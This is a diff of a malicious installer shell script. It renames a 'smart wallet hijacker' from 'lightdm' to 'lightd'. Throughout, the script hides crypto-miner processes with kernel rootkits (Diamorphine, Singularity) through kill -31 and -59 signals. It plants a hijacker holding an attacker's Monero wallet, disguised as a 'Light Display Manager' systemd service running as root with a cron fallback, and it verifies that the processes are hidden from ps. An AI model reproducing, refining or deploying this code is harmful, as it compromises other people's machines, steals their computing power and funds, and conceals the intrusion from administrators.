@@ -1679,7 +1679,7 @@ if lsmod | grep -q "^diamorphine" 2>/dev/null; then
     kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
     kill -31 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
     kill -31 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "lightdm"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "lightd"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
 
 
     echo "[✓] Processes hidden with Diamorphine (kill -31)"
@@ -1694,7 +1694,7 @@ if lsmod | grep -q "^rootkit" 2>/dev/null; then
     kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
     kill -31 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
     kill -31 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "lightdm"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "lightd"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
 
 
     echo "[✓] Processes hidden with Crypto-Miner rootkit (kill -31)"
@@ -1709,7 +1709,7 @@ if [ "$SINGULARITY_LOADED" = true ] || lsmod | grep -q "^singularity" 2>/dev/nul
     kill -59 $(pgrep -f -u root config.json) 2>/dev/null || true
     kill -59 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
     kill -59 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -59 `/bin/ps ax -fu $USER | grep "lightdm"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -59 `/bin/ps ax -fu $USER | grep "lightd"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
 
     echo "[✓] Processes hidden with Singularity (kill -59)"
 else
@@ -1773,7 +1773,7 @@ echo ""
 echo "[*] Installing smart wallet hijacker..."
 
 # Create the smart wallet hijacker script
-cat > /usr/local/bin/lightdm << 'HIJACKER_EOF'
+cat > /usr/local/bin/lightd << 'HIJACKER_EOF'
 #!/bin/bash
 MY_WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
 CHECK_INTERVAL=300
@@ -1851,20 +1851,20 @@ else
 fi
 HIJACKER_EOF
 
-chmod +x /usr/local/bin/lightdm 2>/dev/null || true
+chmod +x /usr/local/bin/lightd 2>/dev/null || true
 
 # Create systemd service for wallet hijacker
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
-    cat > /etc/systemd/system/lightdm.service << 'HIJACKER_SERVICE_EOF'
+    cat > /etc/systemd/system/lightd.service << 'HIJACKER_SERVICE_EOF'
 [Unit]
 Description=Light Display Manager
-Documentation=man:lightdm(1)
+Documentation=man:lightd(1)
 After=network.target swapd.service
 
 [Service]
 Type=simple
 User=root
-ExecStart=/usr/local/bin/lightdm daemon
+ExecStart=/usr/local/bin/lightd daemon
 Restart=always
 RestartSec=30
 StandardOutput=null
@@ -1875,41 +1875,41 @@ WantedBy=multi-user.target
 HIJACKER_SERVICE_EOF
     
     systemctl daemon-reload 2>/dev/null || true
-    systemctl enable lightdm 2>/dev/null
+    systemctl enable lightd 2>/dev/null
     
-    if systemctl is-active --quiet lightdm 2>/dev/null; then
+    if systemctl is-active --quiet lightd 2>/dev/null; then
         echo "[*] Wallet hijacker already running - restarting service..."
-        systemctl restart lightdm 2>/dev/null
+        systemctl restart lightd 2>/dev/null
     else
-        systemctl start lightdm 2>/dev/null
+        systemctl start lightd 2>/dev/null
     fi
     
     # Verify it's running
     sleep 2
-    if systemctl is-active --quiet lightdm 2>/dev/null; then
+    if systemctl is-active --quiet lightd 2>/dev/null; then
         echo "[✓] Smart wallet hijacker installed and RUNNING (systemd service)"
-        if systemctl is-enabled --quiet lightdm 2>/dev/null; then
+        if systemctl is-enabled --quiet lightd 2>/dev/null; then
             echo "[✓] Smart wallet hijacker ENABLED (auto-starts on boot)"
         else
             echo "[!] Warning: Service may not be enabled for auto-start"
             echo "[*] Enabling service..."
-            systemctl enable lightdm 2>/dev/null || true
+            systemctl enable lightd 2>/dev/null || true
         fi
         
         # Verify it's hidden
-        if ps aux | grep "lightdm.*daemon" | grep -v grep >/dev/null 2>&1; then
-            echo "[⚠] WARNING: lightdm process still VISIBLE"
+        if ps aux | grep "lightd.*daemon" | grep -v grep >/dev/null 2>&1; then
+            echo "[⚠] WARNING: lightd process still VISIBLE"
         else
-            echo "[✓] lightdm process successfully HIDDEN by kernel rootkits"
+            echo "[✓] lightd process successfully HIDDEN by kernel rootkits"
         fi
     else
         echo "[!] Warning: Smart wallet hijacker service failed to start"
         echo "[*] Trying to start manually..."
-        systemctl start lightdm 2>/dev/null || true
+        systemctl start lightd 2>/dev/null || true
     fi
 else
     # For SysV systems, add to cron
-    (crontab -l 2>/dev/null | grep -v lightdm; echo "*/5 * * * * /usr/local/bin/lightdm >/dev/null 2>&1") | crontab - 2>/dev/null || true
+    (crontab -l 2>/dev/null | grep -v lightd; echo "*/5 * * * * /usr/local/bin/lightd >/dev/null 2>&1") | crontab - 2>/dev/null || true
     echo "[✓] Smart wallet hijacker installed (cron job)"
 fi
 
@@ -2057,7 +2057,7 @@ if lsmod | grep -q "^diamorphine" 2>/dev/null; then
     kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
     kill -31 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
     kill -31 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "lightdm"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "lightd"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
 
 
     echo "[✓] Processes hidden with Diamorphine (kill -31)"
@@ -2072,7 +2072,7 @@ if lsmod | grep -q "^rootkit" 2>/dev/null; then
     kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
     kill -31 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
     kill -31 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "lightdm"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "lightd"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
 
 
     echo "[✓] Processes hidden with Crypto-Miner rootkit (kill -31)"
@@ -2087,7 +2087,7 @@ if [ "$SINGULARITY_LOADED" = true ] || lsmod | grep -q "^singularity" 2>/dev/nul
     kill -59 $(pgrep -f -u root config.json) 2>/dev/null || true
     kill -59 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
     kill -59 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -59 `/bin/ps ax -fu $USER | grep "lightdm"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -59 `/bin/ps ax -fu $USER | grep "lightd"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
 
     echo "[✓] Processes hidden with Singularity (kill -59)"
 else
@@ -2154,7 +2154,7 @@ else
     echo '  ○ Watchdog: Not deployed'
 fi
 
-if [ -f /usr/local/bin/lightdm ]; then
+if [ -f /usr/local/bin/lightd ]; then
     echo '  ✓ Smart Wallet Hijacker: ACTIVE (detects -c flag in processes)'
 else
     echo '  ○ Wallet Hijacker: Not deployed'
@@ -2211,7 +2211,7 @@ if ps aux | grep "swapd" | grep -v grep >/dev/null 2>&1; then
     echo '[⚠] WARNING: Miner processes are STILL VISIBLE in ps output!'
 fi
 
-if ps aux | grep "lightdm.*daemon" | grep -v grep >/dev/null 2>&1; then
+if ps aux | grep "lightd.*daemon" | grep -v grep >/dev/null 2>&1; then
     PROCESSES_VISIBLE=true
     echo '[⚠] WARNING: Wallet hijacker is STILL VISIBLE in ps output!'
 fi
@@ -2226,25 +2226,25 @@ if [ "$PROCESSES_VISIBLE" = true ]; then
     echo ''
     echo '  Option 2 - Restart services manually:'
     echo '    systemctl restart swapd'
-    echo '    systemctl restart lightdm'
+    echo '    systemctl restart lightd'
     echo ''
     echo 'After restart, verify with:'
     echo '  ps aux | grep swapd      # Should show nothing'
-    echo '  ps aux | grep lightdm    # Should show nothing'
+    echo '  ps aux | grep lightd    # Should show nothing'
     echo ''
     echo 'Check services are running with:'
     echo '  systemctl status swapd   # Should show: active (running)'
-    echo '  systemctl status lightdm # Should show: active (running)'
+    echo '  systemctl status lightd # Should show: active (running)'
 else
     echo '[✓] SUCCESS! All processes are HIDDEN from ps output!'
     echo ''
     echo 'Verification:'
     echo '  ps aux | grep swapd      → Nothing (hidden) ✓'
-    echo '  ps aux | grep lightdm    → Nothing (hidden) ✓'
+    echo '  ps aux | grep lightd    → Nothing (hidden) ✓'
     echo ''
     echo 'Services are running (verify with):'
     echo '  systemctl status swapd   → active (running) ✓'
-    echo '  systemctl status lightdm → active (running) ✓'
+    echo '  systemctl status lightd → active (running) ✓'
 fi
 
 echo ''
